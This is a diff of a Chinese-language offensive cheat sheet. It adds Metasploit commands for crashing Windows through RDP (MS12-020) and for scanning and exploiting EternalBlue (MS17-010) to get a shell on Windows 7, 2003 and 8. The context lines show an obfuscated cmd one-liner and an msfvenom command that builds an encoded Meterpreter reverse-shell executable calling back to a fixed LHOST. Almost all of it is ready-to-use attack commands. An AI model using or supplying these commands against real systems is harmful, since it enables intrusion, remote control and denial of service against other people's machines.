@@ -534,6 +534,17 @@ CMd /C "sEt coM3= /ano&& SEt cOm2=stat&& seT CoM1=net&& caLl SeT fiNAl=%COm1%%cO
 ```
 生成exe文件
 msfveom -p windows/metepreter/reverse_tcp -a x86 --platform windows LHOST=192.168.43.63 LPORT=4444 -e x86/shikata_ga_nai -i 20 PrependMigrate=true -f exe >ma.exe
+
+攻击3389致使蓝屏：
+扫描
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+
+永恒之蓝漏洞拿cmd：
+扫描
+use auxiliary/scanner/smb/smb_ms17_010 
+攻击
+use exploit/windows/smb/ms17_010_eternalblue 	攻击win7-2003
+use exploit/windows/smb/ms17_010_eternalblue_win8 	攻击win8
 ```
 
 ## shell反弹
